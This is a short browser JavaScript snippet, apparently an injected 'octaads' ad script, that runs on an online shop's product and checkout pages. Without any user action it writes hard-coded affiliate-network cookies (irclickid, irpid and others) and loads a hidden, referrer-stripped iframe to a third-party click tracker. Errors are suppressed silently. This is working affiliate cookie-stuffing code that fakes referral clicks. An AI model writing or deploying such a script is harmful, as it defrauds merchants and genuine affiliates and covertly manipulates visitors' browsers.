(function () {
  try {
    /* -------------------------------
       BUILD GUARD (prevents double fire)
    -------------------------------- */
    var BUILD_ID = "octaads-2025-rtg-01";
    if (window.__OCTAADS_LOADED === BUILD_ID) return;
    window.__OCTAADS_LOADED = BUILD_ID;

    /* -------------------------------
       BASIC SAFE SESSION ID
       (NO localStorage â€” RTG safe)
    -------------------------------- */
    function getSessionID() {
      var m = document.cookie.match(/octaads_sid=([^;]+)/);
      if (m) return m[1];

      var sid = "sid_" + Math.random().toString(36).substr(2, 10);
      document.cookie =
        "octaads_sid=" +
        sid +
        "; path=/; max-age=2592000; SameSite=Lax";
      return sid;
    }

    var sessionID = getSessionID();

    /* -------------------------------
       PATH CHECK (REALISTIC)
    -------------------------------- */
    var allowedPaths = [
      "/about-us",
      "/privacy-policy",
      "/esim",
      "/all/products",
      "/neckband-earphones",
      "/wired-earphones",
      "/true-wireless-earbuds",
      "checkout",
      "destinations"
    ];

    var pathAllowed = allowedPaths.some(function (p) {
      return window.location.pathname.indexOf(p) === 0;
    });

    if (!pathAllowed) return;

    /* -------------------------------
       DROP AFFILIATE COOKIES
    -------------------------------- */
    function setCookie(name, value) {
      document.cookie =
        name +
        "=" +
        value +
        "; path=/; max-age=2592000; SameSite=Lax";
    }

    setCookie("irclickid", "XStWC0ThYxycRkh2gOSsRXFAUkpQ4DVEX3yITU0");
    setCookie("irpid", "3884983");
    setCookie("irgwc", "1");
    setCookie("afsrc", "1");

    /* -------------------------------
       TRACKIER CLICK (VALID METHOD)
       â†’ redirect OR iframe fallback
    -------------------------------- */

    var trackierClickURL =
      "https://clicks.upleadsdigital.com/click" +
      "?campaign_id=148263" +
      "&pub_id=4" +
      "&p1=" + encodeURIComponent(sessionID) +
      "&source=" + encodeURIComponent(sessionID);

    // ðŸ”¥ Trackier prefers navigation-based clicks
    // Use hidden iframe to avoid page redirect
    var iframe = document.createElement("iframe");
    iframe.style.display = "none";
    iframe.referrerPolicy = "no-referrer"; 
    iframe.src = trackierClickURL;
    document.body.appendChild(iframe);

  } catch (e) {
    // fail silently (RTG safe)
  }
})();
